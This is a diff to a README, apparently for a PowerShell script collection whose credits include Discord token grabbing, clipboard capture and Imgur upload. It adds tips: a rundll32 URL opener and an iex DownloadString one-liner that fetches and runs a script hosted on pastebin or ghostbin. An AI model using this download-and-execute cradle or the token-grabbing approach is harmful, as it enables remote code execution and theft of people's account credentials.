@@ -18,3 +18,14 @@ Discord Token Grabbing in Powershell | [F1sk](https://github.com/FiskDk/PowerShe
 Getting Images from Clipboard in Powershell | [thom schumacher](https://stackoverflow.com/questions/55215482/save-image-from-clipboard-using-powershell)
 
 Uploading Images to Imgur in Powershell | [Deleted Reddit User](https://www.reddit.com/r/PowerShell/comments/2i0t6f/comment/ckzwori/?utm_source=share&utm_medium=web2x&context=3)
+
+
+## Helpful Powershell Sidenotes
+
+```rundll32 url.dll,FileProtocolHandler 'url here'```
+
+This opens a url in the default browser
+
+```iex ((New-Object System.Net.WebClient).DownloadString('url here'))```
+
+downloads a powershell script from a raw text hosting site [pastebin](https://pastebin.com/) (use unlisted mode if your uploading a script with sensitive information included), [ghostbin](https://ghostbin.com/)
